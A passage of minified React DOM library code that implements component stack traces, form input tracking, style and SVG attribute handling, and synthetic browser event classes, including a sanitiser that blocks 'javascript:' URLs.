                    e.setAttributeNS(t, r, "" + n)
                }
            }
            function ot(e) {
                if (void 0 === Ye)
                    try {
                        throw Error()
                    } catch (r) {
                        var t = r.stack.trim().match(/\n( *(at )?)/);
                        Ye = t && t[1] || "",
                        Je = -1 < r.stack.indexOf("\n    at") ? " (<anonymous>)" : -1 < r.stack.indexOf("@") ? "@unknown:0:0" : ""
                    }
                return "\n" + Ye + e + Je
            }
            var it = !1;
            function st(e, t) {
                if (!e || it)
                    return "";
                it = !0;
                var r = Error.prepareStackTrace;
                Error.prepareStackTrace = void 0;
                try {
                    var n = {
                        DetermineComponentFrameRoot: function() {
                            try {
                                if (t) {
                                    var r = function() {
                                        throw Error()
                                    };
                                    if (Object.defineProperty(r.prototype, "props", {
                                        set: function() {
                                            throw Error()
                                        }
                                    }),
                                    "object" === typeof Reflect && Reflect.construct) {
                                        try {
                                            Reflect.construct(r, [])
                                        } catch (o) {
                                            var n = o
                                        }
                                        Reflect.construct(e, [], r)
                                    } else {
                                        try {
                                            r.call()
                                        } catch (i) {
                                            n = i
                                        }
                                        e.call(r.prototype)
                                    }
                                } else {
                                    try {
                                        throw Error()
                                    } catch (s) {
                                        n = s
                                    }
                                    (r = e()) && "function" === typeof r.catch && r.catch((function() {}
                                    ))
                                }
                            } catch (a) {
                                if (a && n && "string" === typeof a.stack)
                                    return [a.stack, n.stack]
                            }
                            return [null, null]
                        }
                    };
                    n.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
                    var o = Object.getOwnPropertyDescriptor(n.DetermineComponentFrameRoot, "name");
                    o && o.configurable && Object.defineProperty(n.DetermineComponentFrameRoot, "name", {
                        value: "DetermineComponentFrameRoot"
                    });
                    var i = n.DetermineComponentFrameRoot()
                      , s = i[0]
                      , a = i[1];
                    if (s && a) {
                        var c = s.split("\n")
                          , l = a.split("\n");
                        for (o = n = 0; n < c.length && !c[n].includes("DetermineComponentFrameRoot"); )
                            n++;
                        for (; o < l.length && !l[o].includes("DetermineComponentFrameRoot"); )
                            o++;
                        if (n === c.length || o === l.length)
                            for (n = c.length - 1,
                            o = l.length - 1; 1 <= n && 0 <= o && c[n] !== l[o]; )
                                o--;
                        for (; 1 <= n && 0 <= o; n--,
                        o--)
                            if (c[n] !== l[o]) {
                                if (1 !== n || 1 !== o)
                                    do {
                                        if (n--,
                                        0 > --o || c[n] !== l[o]) {
                                            var u = "\n" + c[n].replace(" at new ", " at ");
                                            return e.displayName && u.includes("<anonymous>") && (u = u.replace("<anonymous>", e.displayName)),
                                            u
                                        }
                                    } while (1 <= n && 0 <= o);
                                break
                            }
                    }
                } finally {
                    it = !1,
                    Error.prepareStackTrace = r
                }
                return (r = e ? e.displayName || e.name : "") ? ot(r) : ""
            }
            function at(e) {
                switch (e.tag) {
                case 26:
                case 27:
                case 5:
                    return ot(e.type);
                case 16:
                    return ot("Lazy");
                case 13:
                    return ot("Suspense");
                case 19:
                    return ot("SuspenseList");
                case 0:
                case 15:
                    return st(e.type, !1);
                case 11:
                    return st(e.type.render, !1);
                case 1:
                    return st(e.type, !0);
                case 31:
                    return ot("Activity");
                default:
                    return ""
                }
            }
            function ct(e) {
                try {
                    var t = "";
                    do {
                        t += at(e),
                        e = e.return
                    } while (e);
                    return t
                } catch (r) {
                    return "\nError generating stack: " + r.message + "\n" + r.stack
                }
            }
            function lt(e) {
                switch (typeof e) {
                case "bigint":
                case "boolean":
                case "number":
                case "string":
                case "undefined":
                case "object":
                    return e;
                default:
                    return ""
                }
            }
            function ut(e) {
                var t = e.type;
                return (e = e.nodeName) && "input" === e.toLowerCase() && ("checkbox" === t || "radio" === t)
            }
            function dt(e) {
                e._valueTracker || (e._valueTracker = function(e) {
                    var t = ut(e) ? "checked" : "value"
                      , r = Object.getOwnPropertyDescriptor(e.constructor.prototype, t)
                      , n = "" + e[t];
                    if (!e.hasOwnProperty(t) && "undefined" !== typeof r && "function" === typeof r.get && "function" === typeof r.set) {
                        var o = r.get
                          , i = r.set;
                        return Object.defineProperty(e, t, {
                            configurable: !0,
                            get: function() {
                                return o.call(this)
                            },
                            set: function(e) {
                                n = "" + e,
                                i.call(this, e)
                            }
                        }),
                        Object.defineProperty(e, t, {
                            enumerable: r.enumerable
                        }),
                        {
                            getValue: function() {
                                return n
                            },
                            setValue: function(e) {
                                n = "" + e
                            },
                            stopTracking: function() {
                                e._valueTracker = null,
                                delete e[t]
                            }
                        }
                    }
                }(e))
            }
            function ht(e) {
                if (!e)
                    return !1;
                var t = e._valueTracker;
                if (!t)
                    return !0;
                var r = t.getValue()
                  , n = "";
                return e && (n = ut(e) ? e.checked ? "true" : "false" : e.value),
                (e = n) !== r && (t.setValue(e),
                !0)
            }
            function ft(e) {
                if ("undefined" === typeof (e = e || ("undefined" !== typeof document ? document : void 0)))
                    return null;
                try {
                    return e.activeElement || e.body
                } catch (t) {
                    return e.body
                }
            }
            var pt = /[\n"\\]/g;
            function gt(e) {
                return e.replace(pt, (function(e) {
                    return "\\" + e.charCodeAt(0).toString(16) + " "
                }
                ))
            }
            function yt(e, t, r, n, o, i, s, a) {
                e.name = "",
                null != s && "function" !== typeof s && "symbol" !== typeof s && "boolean" !== typeof s ? e.type = s : e.removeAttribute("type"),
                null != t ? "number" === s ? (0 === t && "" === e.value || e.value != t) && (e.value = "" + lt(t)) : e.value !== "" + lt(t) && (e.value = "" + lt(t)) : "submit" !== s && "reset" !== s || e.removeAttribute("value"),
                null != t ? bt(e, s, lt(t)) : null != r ? bt(e, s, lt(r)) : null != n && e.removeAttribute("value"),
                null == o && null != i && (e.defaultChecked = !!i),
                null != o && (e.checked = o && "function" !== typeof o && "symbol" !== typeof o),
                null != a && "function" !== typeof a && "symbol" !== typeof a && "boolean" !== typeof a ? e.name = "" + lt(a) : e.removeAttribute("name")
            }
            function mt(e, t, r, n, o, i, s, a) {
                if (null != i && "function" !== typeof i && "symbol" !== typeof i && "boolean" !== typeof i && (e.type = i),
                null != t || null != r) {
                    if (!("submit" !== i && "reset" !== i || void 0 !== t && null !== t))
                        return;
                    r = null != r ? "" + lt(r) : "",
                    t = null != t ? "" + lt(t) : r,
                    a || t === e.value || (e.value = t),
                    e.defaultValue = t
                }
                n = "function" !== typeof (n = null != n ? n : o) && "symbol" !== typeof n && !!n,
                e.checked = a ? e.checked : !!n,
                e.defaultChecked = !!n,
                null != s && "function" !== typeof s && "symbol" !== typeof s && "boolean" !== typeof s && (e.name = s)
            }
            function bt(e, t, r) {
                "number" === t && ft(e.ownerDocument) === e || e.defaultValue === "" + r || (e.defaultValue = "" + r)
            }
            function vt(e, t, r, n) {
                if (e = e.options,
                t) {
                    t = {};
                    for (var o = 0; o < r.length; o++)
                        t["$" + r[o]] = !0;
                    for (r = 0; r < e.length; r++)
                        o = t.hasOwnProperty("$" + e[r].value),
                        e[r].selected !== o && (e[r].selected = o),
                        o && n && (e[r].defaultSelected = !0)
                } else {
                    for (r = "" + lt(r),
                    t = null,
                    o = 0; o < e.length; o++) {
                        if (e[o].value === r)
                            return e[o].selected = !0,
                            void (n && (e[o].defaultSelected = !0));
                        null !== t || e[o].disabled || (t = e[o])
                    }
                    null !== t && (t.selected = !0)
                }
            }
            function wt(e, t, r) {
                null == t || ((t = "" + lt(t)) !== e.value && (e.value = t),
                null != r) ? e.defaultValue = null != r ? "" + lt(r) : "" : e.defaultValue !== t && (e.defaultValue = t)
            }
            function Tt(e, t, r, n) {
                if (null == t) {
                    if (null != n) {
                        if (null != r)
                            throw Error(s(92));
                        if (R(n)) {
                            if (1 < n.length)
                                throw Error(s(93));
                            n = n[0]
                        }
                        r = n
                    }
                    null == r && (r = ""),
                    t = r
                }
                r = lt(t),
                e.defaultValue = r,
                (n = e.textContent) === r && "" !== n && null !== n && (e.value = n)
            }
            function At(e, t) {
                if (t) {
                    var r = e.firstChild;
                    if (r && r === e.lastChild && 3 === r.nodeType)
                        return void (r.nodeValue = t)
                }
                e.textContent = t
            }
            var Et = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
            function Pt(e, t, r) {
                var n = 0 === t.indexOf("--");
                null == r || "boolean" === typeof r || "" === r ? n ? e.setProperty(t, "") : "float" === t ? e.cssFloat = "" : e[t] = "" : n ? e.setProperty(t, r) : "number" !== typeof r || 0 === r || Et.has(t) ? "float" === t ? e.cssFloat = r : e[t] = ("" + r).trim() : e[t] = r + "px"
            }
            function Ct(e, t, r) {
                if (null != t && "object" !== typeof t)
                    throw Error(s(62));
                if (e = e.style,
                null != r) {
                    for (var n in r)
                        !r.hasOwnProperty(n) || null != t && t.hasOwnProperty(n) || (0 === n.indexOf("--") ? e.setProperty(n, "") : "float" === n ? e.cssFloat = "" : e[n] = "");
                    for (var o in t)
                        n = t[o],
                        t.hasOwnProperty(o) && r[o] !== n && Pt(e, o, n)
                } else
                    for (var i in t)
                        t.hasOwnProperty(i) && Pt(e, i, t[i])
            }
            function St(e) {
                if (-1 === e.indexOf("-"))
                    return !1;
                switch (e) {
                case "annotation-xml":
                case "color-profile":
                case "font-face":
                case "font-face-src":
                case "font-face-uri":
                case "font-face-format":
                case "font-face-name":
                case "missing-glyph":
                    return !1;
                default:
                    return !0
                }
            }
            var It = new Map([["acceptCharset", "accept-charset"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"], ["crossOrigin", "crossorigin"], ["accentHeight", "accent-height"], ["alignmentBaseline", "alignment-baseline"], ["arabicForm", "arabic-form"], ["baselineShift", "baseline-shift"], ["capHeight", "cap-height"], ["clipPath", "clip-path"], ["clipRule", "clip-rule"], ["colorInterpolation", "color-interpolation"], ["colorInterpolationFilters", "color-interpolation-filters"], ["colorProfile", "color-profile"], ["colorRendering", "color-rendering"], ["dominantBaseline", "dominant-baseline"], ["enableBackground", "enable-background"], ["fillOpacity", "fill-opacity"], ["fillRule", "fill-rule"], ["floodColor", "flood-color"], ["floodOpacity", "flood-opacity"], ["fontFamily", "font-family"], ["fontSize", "font-size"], ["fontSizeAdjust", "font-size-adjust"], ["fontStretch", "font-stretch"], ["fontStyle", "font-style"], ["fontVariant", "font-variant"], ["fontWeight", "font-weight"], ["glyphName", "glyph-name"], ["glyphOrientationHorizontal", "glyph-orientation-horizontal"], ["glyphOrientationVertical", "glyph-orientation-vertical"], ["horizAdvX", "horiz-adv-x"], ["horizOriginX", "horiz-origin-x"], ["imageRendering", "image-rendering"], ["letterSpacing", "letter-spacing"], ["lightingColor", "lighting-color"], ["markerEnd", "marker-end"], ["markerMid", "marker-mid"], ["markerStart", "marker-start"], ["overlinePosition", "overline-position"], ["overlineThickness", "overline-thickness"], ["paintOrder", "paint-order"], ["panose-1", "panose-1"], ["pointerEvents", "pointer-events"], ["renderingIntent", "rendering-intent"], ["shapeRendering", "shape-rendering"], ["stopColor", "stop-color"], ["stopOpacity", "stop-opacity"], ["strikethroughPosition", "strikethrough-position"], ["strikethroughThickness", "strikethrough-thickness"], ["strokeDasharray", "stroke-dasharray"], ["strokeDashoffset", "stroke-dashoffset"], ["strokeLinecap", "stroke-linecap"], ["strokeLinejoin", "stroke-linejoin"], ["strokeMiterlimit", "stroke-miterlimit"], ["strokeOpacity", "stroke-opacity"], ["strokeWidth", "stroke-width"], ["textAnchor", "text-anchor"], ["textDecoration", "text-decoration"], ["textRendering", "text-rendering"], ["transformOrigin", "transform-origin"], ["underlinePosition", "underline-position"], ["underlineThickness", "underline-thickness"], ["unicodeBidi", "unicode-bidi"], ["unicodeRange", "unicode-range"], ["unitsPerEm", "units-per-em"], ["vAlphabetic", "v-alphabetic"], ["vHanging", "v-hanging"], ["vIdeographic", "v-ideographic"], ["vMathematical", "v-mathematical"], ["vectorEffect", "vector-effect"], ["vertAdvY", "vert-adv-y"], ["vertOriginX", "vert-origin-x"], ["vertOriginY", "vert-origin-y"], ["wordSpacing", "word-spacing"], ["writingMode", "writing-mode"], ["xmlnsXlink", "xmlns:xlink"], ["xHeight", "x-height"]])
              , Bt = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
            function xt(e) {
                return Bt.test("" + e) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : e
            }
            var Ot = null;
            function _t(e) {
                return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement),
                3 === e.nodeType ? e.parentNode : e
            }
            var Wt = null
              , Rt = null;
            function kt(e) {
                var t = ze(e);
                if (t && (e = t.stateNode)) {
                    var r = e[Re] || null;
                    e: switch (e = t.stateNode,
                    t.type) {
                    case "input":
                        if (yt(e, r.value, r.defaultValue, r.defaultValue, r.checked, r.defaultChecked, r.type, r.name),
                        t = r.name,
                        "radio" === r.type && null != t) {
                            for (r = e; r.parentNode; )
                                r = r.parentNode;
                            for (r = r.querySelectorAll('input[name="' + gt("" + t) + '"][type="radio"]'),
                            t = 0; t < r.length; t++) {
                                var n = r[t];
                                if (n !== e && n.form === e.form) {
                                    var o = n[Re] || null;
                                    if (!o)
                                        throw Error(s(90));
                                    yt(n, o.value, o.defaultValue, o.defaultValue, o.checked, o.defaultChecked, o.type, o.name)
                                }
                            }
                            for (t = 0; t < r.length; t++)
                                (n = r[t]).form === e.form && ht(n)
                        }
                        break e;
                    case "textarea":
                        wt(e, r.value, r.defaultValue);
                        break e;
                    case "select":
                        null != (t = r.value) && vt(e, !!r.multiple, t, !1)
                    }
                }
            }
            var Mt = !1;
            function Nt(e, t, r) {
                if (Mt)
                    return e(t, r);
                Mt = !0;
                try {
                    return e(t)
                } finally {
                    if (Mt = !1,
                    (null !== Wt || null !== Rt) && (jl(),
                    Wt && (t = Wt,
                    e = Rt,
                    Rt = Wt = null,
                    kt(t),
                    e)))
                        for (t = 0; t < e.length; t++)
                            kt(e[t])
                }
            }
            function Ft(e, t) {
                var r = e.stateNode;
                if (null === r)
                    return null;
                var n = r[Re] || null;
                if (null === n)
                    return null;
                r = n[t];
                e: switch (t) {
                case "onClick":
                case "onClickCapture":
                case "onDoubleClick":
                case "onDoubleClickCapture":
                case "onMouseDown":
                case "onMouseDownCapture":
                case "onMouseMove":
                case "onMouseMoveCapture":
                case "onMouseUp":
                case "onMouseUpCapture":
                case "onMouseEnter":
                    (n = !n.disabled) || (n = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)),
                    e = !n;
                    break e;
                default:
                    e = !1
                }
                if (e)
                    return null;
                if (r && "function" !== typeof r)
                    throw Error(s(231, t, typeof r));
                return r
            }
            var Ut = !("undefined" === typeof window || "undefined" === typeof window.document || "undefined" === typeof window.document.createElement)
              , Dt = !1;
            if (Ut)
                try {
                    var Lt = {};
                    Object.defineProperty(Lt, "passive", {
                        get: function() {
                            Dt = !0
                        }
                    }),
                    window.addEventListener("test", Lt, Lt),
                    window.removeEventListener("test", Lt, Lt)
                } catch (Rh) {
                    Dt = !1
                }
            var jt = null
              , zt = null
              , Vt = null;
            function Ht() {
                if (Vt)
                    return Vt;
                var e, t, r = zt, n = r.length, o = "value"in jt ? jt.value : jt.textContent, i = o.length;
                for (e = 0; e < n && r[e] === o[e]; e++)
                    ;
                var s = n - e;
                for (t = 1; t <= s && r[n - t] === o[i - t]; t++)
                    ;
                return Vt = o.slice(e, 1 < t ? 1 - t : void 0)
            }
            function qt(e) {
                var t = e.keyCode;
                return "charCode"in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : e = t,
                10 === e && (e = 13),
                32 <= e || 13 === e ? e : 0
            }
            function Gt() {
                return !0
            }
            function $t() {
                return !1
            }
            function Kt(e) {
                function t(t, r, n, o, i) {
                    for (var s in this._reactName = t,
                    this._targetInst = n,
                    this.type = r,
                    this.nativeEvent = o,
                    this.target = i,
                    this.currentTarget = null,
                    e)
                        e.hasOwnProperty(s) && (t = e[s],
                        this[s] = t ? t(o) : o[s]);
                    return this.isDefaultPrevented = (null != o.defaultPrevented ? o.defaultPrevented : !1 === o.returnValue) ? Gt : $t,
                    this.isPropagationStopped = $t,
                    this
                }
                return h(t.prototype, {
                    preventDefault: function() {
                        this.defaultPrevented = !0;
                        var e = this.nativeEvent;
                        e && (e.preventDefault ? e.preventDefault() : "unknown" !== typeof e.returnValue && (e.returnValue = !1),
                        this.isDefaultPrevented = Gt)
                    },
                    stopPropagation: function() {
                        var e = this.nativeEvent;
                        e && (e.stopPropagation ? e.stopPropagation() : "unknown" !== typeof e.cancelBubble && (e.cancelBubble = !0),
                        this.isPropagationStopped = Gt)
                    },
                    persist: function() {},
                    isPersistent: Gt
                }),
                t
            }
            var Zt, Yt, Jt, Xt = {
                eventPhase: 0,
                bubbles: 0,
                cancelable: 0,
                timeStamp: function(e) {
                    return e.timeStamp || Date.now()
                },
                defaultPrevented: 0,
                isTrusted: 0
            }, Qt = Kt(Xt), er = h({}, Xt, {
                view: 0,
                detail: 0
            }), tr = Kt(er), rr = h({}, er, {
                screenX: 0,
                screenY: 0,
                clientX: 0,
                clientY: 0,
                pageX: 0,
                pageY: 0,
                ctrlKey: 0,
                shiftKey: 0,
                altKey: 0,
                metaKey: 0,
                getModifierState: fr,
                button: 0,
                buttons: 0,
                relatedTarget: function(e) {
                    return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget
                },
                movementX: function(e) {
                    return "movementX"in e ? e.movementX : (e !== Jt && (Jt && "mousemove" === e.type ? (Zt = e.screenX - Jt.screenX,
                    Yt = e.screenY - Jt.screenY) : Yt = Zt = 0,
                    Jt = e),
                    Zt)
                },
                movementY: function(e) {
                    return "movementY"in e ? e.movementY : Yt
                }
            }), nr = Kt(rr), or = Kt(h({}, rr, {
                dataTransfer: 0
            })), ir = Kt(h({}, er, {
                relatedTarget: 0
            })), sr = Kt(h({}, Xt, {
                animationName: 0,
                elapsedTime: 0,
                pseudoElement: 0
            })), ar = Kt(h({}, Xt, {
                clipboardData: function(e) {
                    return "clipboardData"in e ? e.clipboardData : window.clipboardData
                }
            })), cr = Kt(h({}, Xt, {
                data: 0
            })), lr = {
                Esc: "Escape",
                Spacebar: " ",
                Left: "ArrowLeft",
                Up: "ArrowUp",
                Right: "ArrowRight",
                Down: "ArrowDown",
                Del: "Delete",
                Win: "OS",
                Menu: "ContextMenu",
                Apps: "ContextMenu",
                Scroll: "ScrollLock",
                MozPrintableKey: "Unidentified"
            }, ur = {
                8: "Backspace",
                9: "Tab",
                12: "Clear",
                13: "Enter",
                16: "Shift",
                17: "Control",
                18: "Alt",
                19: "Pause",
                20: "CapsLock",
                27: "Escape",
                32: " ",
                33: "PageUp",
                34: "PageDown",
                35: "End",
                36: "Home",
                37: "ArrowLeft",
                38: "ArrowUp",
                39: "ArrowRight",
                40: "ArrowDown",
                45: "Insert",
                46: "Delete",
                112: "F1",
                113: "F2",
                114: "F3",
                115: "F4",
                116: "F5",
                117: "F6",
                118: "F7",
                119: "F8",
                120: "F9",
                121: "F10",
                122: "F11",
                123: "F12",
                144: "NumLock",
                145: "ScrollLock",
                224: "Meta"
            }, dr = {
                Alt: "altKey",
                Control: "ctrlKey",
                Meta: "metaKey",
                Shift: "shiftKey"
            };
            function hr(e) {
                var t = this.nativeEvent;
                return t.getModifierState ? t.getModifierState(e) : !!(e = dr[e]) && !!t[e]
            }
            function fr() {
                return hr
            }
            var pr = Kt(h({}, er, {
                key: function(e) {
                    if (e.key) {
                        var t = lr[e.key] || e.key;
                        if ("Unidentified" !== t)
                            return t
                    }
                    return "keypress" === e.type ? 13 === (e = qt(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? ur[e.keyCode] || "Unidentified" : ""
                },
                code: 0,
                location: 0,
                ctrlKey: 0,
                shiftKey: 0,
                altKey: 0,
                metaKey: 0,
                repeat: 0,
                locale: 0,
                getModifierState: fr,
                charCode: function(e) {
                    return "keypress" === e.type ? qt(e) : 0
                },
                keyCode: function(e) {
                    return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                },
                which: function(e) {
                    return "keypress" === e.type ? qt(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0
                }
            }))
              , gr = Kt(h({}, rr, {
                pointerId: 0,
                width: 0,
                height: 0,
                pressure: 0,
                tangentialPressure: 0,
                tiltX: 0,
                tiltY: 0,
                twist: 0,
                pointerType: 0,
                isPrimary: 0
            }))
              , yr = Kt(h({}, er, {
                touches: 0,
                targetTouches: 0,
                changedTouches: 0,
                altKey: 0,
                metaKey: 0,
                ctrlKey: 0,
                shiftKey: 0,
                getModifierState: fr
            }))
              , mr = Kt(h({}, Xt, {
                propertyName: 0,
                elapsedTime: 0,
                pseudoElement: 0
            }))
              , br = Kt(h({}, rr, {
                deltaX: function(e) {
                    return "deltaX"in e ? e.deltaX : "wheelDeltaX"in e ? -e.wheelDeltaX : 0
                },
                deltaY: function(e) {
                    return "deltaY"in e ? e.deltaY : "wheelDeltaY"in e ? -e.wheelDeltaY : "wheelDelta"in e ? -e.wheelDelta : 0
                },
                deltaZ: 0,
                deltaMode: 0
            }))
              , vr = Kt(h({}, Xt, {
                newState: 0,
                oldState: 0
            }))
              , wr = [9, 13, 27, 32]
              , Tr = Ut && "CompositionEvent"in window
              , Ar = null;
            Ut && "documentMode"in document && (Ar = document.documentMode);
            var Er = Ut && "TextEvent"in window && !Ar
              , Pr = Ut && (!Tr || Ar && 8 < Ar && 11 >= Ar)
              , Cr = String.fromCharCode(32)
              , Sr = !1;
            function Ir(e, t) {
                switch (e) {
                case "keyup":
                    return -1 !== wr.indexOf(t.keyCode);
                case "keydown":
                    return 229 !== t.keyCode;
                case "keypress":
                case "mousedown":
                case "focusout":
                    return !0;
                default:
                    return !1
                }
            }
            function Br(e) {
                return "object" === typeof (e = e.detail) && "data"in e ? e.data : null
            }
            var xr = !1;
            var Or = {
                color: !0,
                date: !0,
                datetime: !0,
                "datetime-local": !0,
                email: !0,
                month: !0,
                number: !0,
                password: !0,
                range: !0,
                search: !0,
                tel: !0,
                text: !0,
                time: !0,
                url: !0,
                week: !0
            };
            function _r(e) {
                var t = e && e.nodeName && e.nodeName.toLowerCase();
                return "input" === t ? !!Or[e.type] : "textarea" === t
            }
            function Wr(e, t, r, n) {
                Wt ? Rt ? Rt.push(n) : Rt = [n] : Wt = n,
                0 < (t = Hu(t, "onChange")).length && (r = new Qt("onChange","change",null,r,n),
                e.push({
                    event: r,
                    listeners: t
                }))
            }
            var Rr = null
              , kr = null;
            function Mr(e) {
                Nu(e, 0)
            }
            function Nr(e) {
                if (ht(Ve(e)))
                    return e
            }
            function Fr(e, t) {
                if ("change" === e)
                    return t
            }
            var Ur = !1;
            if (Ut) {
                var Dr;
                if (Ut) {
                    var Lr = "oninput"in document;
                    if (!Lr) {
                        var jr = document.createElement("div");
                        jr.setAttribute("oninput", "return;"),
                        Lr = "function" === typeof jr.oninput
                    }
                    Dr = Lr
                } else
                    Dr = !1;
                Ur = Dr && (!document.documentMode || 9 < document.documentMode)
            }
            function zr() {
                Rr && (Rr.detachEvent("onpropertychange", Vr),
                kr = Rr = null)
            }
            function Vr(e) {
                if ("value" === e.propertyName && Nr(kr)) {
                    var t = [];
                    Wr(t, kr, e, _t(e)),
                    Nt(Mr, t)
                }
            }
            function Hr(e, t, r) {
                "focusin" === e ? (zr(),
                kr = r,
                (Rr = t).attachEvent("onpropertychange", Vr)) : "focusout" === e && zr()
            }
            function qr(e) {
                if ("selectionchange" === e || "keyup" === e || "keydown" === e)
                    return Nr(kr)
            }
            function Gr(e, t) {
                if ("click" === e)
                    return Nr(t)
            }
            function $r(e, t) {
                if ("input" === e || "change" === e)
                    return Nr(t)
            }
            var Kr = "function" === typeof Object.is ? Object.is : function(e, t) {
                return e === t && (0 !== e || 1 / e === 1 / t) || e !== e && t !== t
            }
            ;
            function Zr(e, t) {
                if (Kr(e, t))
                    return !0;
                if ("object" !== typeof e || null === e || "object" !== typeof t || null === t)
                    return !1;
                var r = Object.keys(e)
                  , n = Object.keys(t);
                if (r.length !== n.length)
                    return !1;
                for (n = 0; n < r.length; n++) {
                    var o = r[n];
                    if (!Y.call(t, o) || !Kr(e[o], t[o]))
                        return !1
                }
                return !0
            }
            function Yr(e) {
                for (; e && e.firstChild; )
                    e = e.firstChild;
                return e
            }
            function Jr(e, t) {
                var r, n = Yr(e);
                for (e = 0; n; ) {
                    if (3 === n.nodeType) {
                        if (r = e + n.textContent.length,
                        e <= t && r >= t)
                            return {
                                node: n,
                                offset: t - e
                            };
                        e = r
                    }
                    e: {
                        for (; n; ) {
                            if (n.nextSibling) {
                                n = n.nextSibling;
                                break e
                            }
                            n = n.parentNode
                        }
                        n = void 0
                    }
                    n = Yr(n)
                }
            }
            function Xr(e, t) {
                return !(!e || !t) && (e === t || (!e || 3 !== e.nodeType) && (t && 3 === t.nodeType ? Xr(e, t.parentNode) : "contains"in e ? e.contains(t) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(t))))
            }
            function Qr(e) {
                for (var t = ft((e = null != e && null != e.ownerDocument && null != e.ownerDocument.defaultView ? e.ownerDocument.defaultView : window).document); t instanceof e.HTMLIFrameElement; ) {
                    try {
                        var r = "string" === typeof t.contentWindow.location.href
                    } catch (n) {
                        r = !1
                    }
                    if (!r)
                        break;
                    t = ft((e = t.contentWindow).document)
                }
                return t
            }
            function en(e) {
                var t = e && e.nodeName && e.nodeName.toLowerCase();
                return t && ("input" === t && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === t || "true" === e.contentEditable)
            }
            var tn = Ut && "documentMode"in document && 11 >= document.documentMode
              , rn = null
              , nn = null
              , on = null
              , sn = !1;
            function an(e, t, r) {
                var n = r.window === r ? r.document : 9 === r.nodeType ? r : r.ownerDocument;
                sn || null == rn || rn !== ft(n) || ("selectionStart"in (n = rn) && en(n) ? n = {
                    start: n.selectionStart,
                    end: n.selectionEnd
                } : n = {
                    anchorNode: (n = (n.ownerDocument && n.ownerDocument.defaultView || window).getSelection()).anchorNode,
                    anchorOffset: n.anchorOffset,
                    focusNode: n.focusNode,
                    focusOffset: n.focusOffset
                },
                on && Zr(on, n) || (on = n,
                0 < (n = Hu(nn, "onSelect")).length && (t = new Qt("onSelect","select",null,t,r),
                e.push({
                    event: t,
                    listeners: n
                }),
                t.target = rn)))
            }
            function cn(e, t) {
                var r = {};
                return r[e.toLowerCase()] = t.toLowerCase(),
                r["Webkit" + e] = "webkit" + t,
                r["Moz" + e] = "moz" + t,
                r
            }
            var ln = {
                animationend: cn("Animation", "AnimationEnd"),
                animationiteration: cn("Animation", "AnimationIteration"),
                animationstart: cn("Animation", "AnimationStart"),
                transitionrun: cn("Transition", "TransitionRun"),
                transitionstart: cn("Transition", "TransitionStart"),
                transitioncancel: cn("Transition", "TransitionCancel"),
                transitionend: cn("Transition", "TransitionEnd")
            }
              , un = {}
              , dn = {};
            function hn(e) {
                if (un[e])
                    return un[e];
                if (!ln[e])
                    return e;
                var t, r = ln[e];
                for (t in r)
                    if (r.hasOwnProperty(t) && t in dn)
                        return un[e] = r[t];
                return e
            }
            Ut && (dn = document.createElement("div").style,
            "AnimationEvent"in window || (delete ln.animationend.animation,
            delete ln.animationiteration.animation,
            delete ln.animationstart.animation),
            "TransitionEvent"in window || delete ln.transitionend.transition);
            var fn = hn("animationend")
              , pn = hn("animationiteration")
              , gn = hn("animationstart")
              , yn = hn("transitionrun")
              , mn = hn("transitionstart")
              , bn = hn("transitioncancel")
              , vn = hn("transitionend")
              , wn = new Map
              , Tn = "abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
            function An(e, t) {
                wn.set(e, t),
                Ke(t, [e])
            }
            Tn.push("scrollEnd");
            var En = new WeakMap;
            function Pn(e, t) {
                if ("object" === typeof e && null !== e) {
                    var r = En.get(e);
                    return void 0 !== r ? r : (t = {
                        value: e,
                        source: t,
                        stack: ct(t)
                    },
                    En.set(e, t),
                    t)
                }
                return {
                    value: e,
                    source: t,
                    stack: ct(t)
                }
            }
            var Cn = []
              , Sn = 0
              , In = 0;
            function Bn() {
                for (var e = Sn, t = In = Sn = 0; t < e; ) {
                    var r = Cn[t];
                    Cn[t++] = null;
                    var n = Cn[t];
                    Cn[t++] = null;
                    var o = Cn[t];
                    Cn[t++] = null;
                    var i = Cn[t];
                    if (Cn[t++] = null,
                    null !== n && null !== o) {
